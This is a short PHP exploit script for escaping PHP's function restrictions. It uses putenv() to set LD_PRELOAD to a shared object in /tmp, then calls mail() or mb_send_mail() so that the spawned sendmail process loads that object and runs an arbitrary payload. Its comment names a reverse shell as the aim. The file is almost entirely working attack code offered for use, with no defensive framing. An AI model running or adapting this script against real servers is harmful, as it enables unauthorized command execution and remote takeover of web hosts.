<?php

if(!function_exists('putenv')) {
    die('Not vulnerable');
}

/**
 * absolute path only
 */
$ld_preload_path = '/tmp/preload.so';
$payload_path = '/tmp/payload';

putenv(sprintf('PRELOAD=%s', $payload_path));
putenv(sprintf('LD_PRELOAD=%s', $ld_preload_path));

/**
 * PHP in Linux calls a binary "sendmail" when the mail() function is executed. If we have putenv() allowed, we can set the environment variable "LD_PRELOAD", so we can preload an arbitrary shared object. Our shared object will execute our custom payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell
 */
if(function_exists('mail')) {
	@mail('a','a','a','a');
} elseif(function_exists('mb_send_mail')) {
	@mb_send_mail('a','a','a','a'); // alternative mail()
}
